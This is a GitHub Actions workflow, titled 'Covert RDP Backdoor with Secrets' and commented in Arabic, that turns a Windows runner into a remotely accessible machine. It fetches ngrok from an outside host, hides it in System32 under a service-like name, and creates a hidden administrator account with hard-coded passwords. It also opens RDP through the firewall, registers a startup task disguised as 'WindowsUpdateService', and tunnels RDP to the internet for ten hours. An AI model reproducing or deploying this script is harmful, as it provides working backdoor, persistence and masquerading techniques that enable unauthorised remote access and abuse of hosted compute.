name: Covert RDP Backdoor with Secrets

on:
  workflow_dispatch: # يمكن تشغيله يدويًا

jobs:
  establish_foothold:
    runs-on: windows-latest
    env:
      NGROK_AUTH: ${{ secrets.NGROK_AUTH_TOKEN }} # يتم جلب الرمز المميز من الأسرار!
      RDP_USER: Ramy
      RDP_PASS: Ramy123

    steps:
      - name: Stage Ngrok (Stealthy Download)
        run: |
          $tempDir = New-Item -Path $env:TEMP -Name "temp_ngrok_stage" -ItemType Directory -Force
          Set-Location $tempDir
          Invoke-WebRequest -Uri "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-windows-amd64.zip" -OutFile "ngrok.zip"
          Expand-Archive "ngrok.zip" -DestinationPath . -Force
          .\ngrok.exe authtoken $env:NGROK_AUTH
          Move-Item -Path .\ngrok.exe -Destination "C:\Windows\System32\ngrok_service.exe" -Force
          Remove-Item -Path "ngrok.zip", "LICENSE", "README.md" -ErrorAction SilentlyContinue -Force # <-- التعديل هنا!
          Set-Location C:\
        shell: pwsh

      - name: Create Stealthy RDP User & Admin Privileges
        run: |
          # 1. Choose a stronger password that meets policy and avoids interactive prompt
          net user "Ramy" "R@myPass123!A" /add /expires:never /active:yes
          Start-Sleep -Seconds 2
          net localgroup administrators "Ramy" /add
          
          # Enable RDP connections via Registry (more direct)
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp' -Name 'UserAuthentication' -Value 1 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name 'PortNumber' -Value 3389 -Force
          
          # Allow RDP through Firewall (تأكد من svchost.exe)
          New-NetFirewallRule -DisplayName "Allow RDP Access - Covert" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 -Program "%SystemRoot%\system32\svchost.exe" -EdgeTraversalPolicy Allow
          
          # *** التعديلات الجديدة والقوية لضمان تفعيل RDP ***
          
          # تأكيد تفعيل خدمة سطح المكتب البعيد وجعلها تبدأ تلقائيًا
          Set-Service -Name "TermService" -StartupType Automatic -Force
          Start-Service -Name "TermService" -ErrorAction SilentlyContinue
          
          # تمكين قاعدة جدار الحماية الافتراضية لسطح المكتب البعيد (إذا كانت معطلة)
          Enable-NetFirewallRule -DisplayName "Remote Desktop - User Mode (TCP-In)" -ErrorAction SilentlyContinue
          # إزالة هذا السطر لأنه يسبب الخطأ في Get-NetFirewallRule
          # Enable-NetFirewallRule -DisplayName "Remote Desktop (TCP-In)" -ErrorAction SilentlyContinue 
          
          # تأخير إضافي للسماح بتطبيق الإعدادات
          Start-Sleep -Seconds 10
          
          # التحقق من حالة خدمة RDP في السجلات (للتشخيص) - هذه الأوامر لا تسبب الفشل
          Write-Host "Checking TermService status..."
          Get-Service -Name "TermService" | Select-Object Name, Status, StartType | Format-List
          
          Write-Host "Checking RDP firewall rules..."
          # تعديل هنا: تجاهل الخطأ إذا لم يتم العثور على قاعدة "Remote Desktop (TCP-In)"
          Get-NetFirewallRule -DisplayName "Allow RDP Access - Covert", "Remote Desktop - User Mode (TCP-In)" -ErrorAction SilentlyContinue | Select-Object DisplayName, Enabled, Action, Protocol, LocalPort | Format-List
          
          Start-Sleep -Seconds 5 # تأخير إضافي قبل الانتقال إلى Ngrok
          
        shell: pwsh
        
      - name: Establish Ngrok Tunnel for RDP (Persistent)
        run: |
          # 1. تعريف الإجراء للمهمة المجدولة (يمكن تحديثه هنا أيضًا للحصول على سجلات الثبات)
          $action = New-ScheduledTaskAction -Execute "C:\Windows\System32\ngrok_service.exe" -Argument "tcp 3389 --log=log.txt --log-level=info" # تم التعديل هنا أيضًا
          $trigger = New-ScheduledTaskTrigger -AtStartup
          Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $action -Trigger $trigger -Description "Maintains critical Windows services." -Force
          
          # 2. تشغيل ngrok فوراً وطباعة سجله
          Start-Process "C:\Windows\System32\ngrok_service.exe" -ArgumentList "tcp 3389 --log=log.txt --log-level=info" -NoNewWindow -PassThru | Out-Null
          Start-Sleep -Seconds 5 # أعط ngrok بعض الوقت لكتابة الملف
          Get-Content "log.txt" # هذا سيطبع محتوى log.txt إلى سجلات GitHub Actions
          
          # 3. رسائل تأكيد في السجل
          Start-Sleep -Seconds 10 # انتظار إضافي قبل رسائل التأكيد
          echo "Ngrok tunnel for RDP is now active. Use username 'Ramy' and password 'Ramy123'."
          echo "Check GitHub Actions logs for the public Ngrok URL to connect."
          echo "You will find the URL in the log output, it will look something like: tcp://0.tcp.ngrok.io:XXXXX"
        shell: pwsh

      - name: Keep Workflow Running (for tunnel persistence)
        run: |
          Start-Sleep -Seconds 36000 # Keep alive for 10 hours
        shell: pwsh
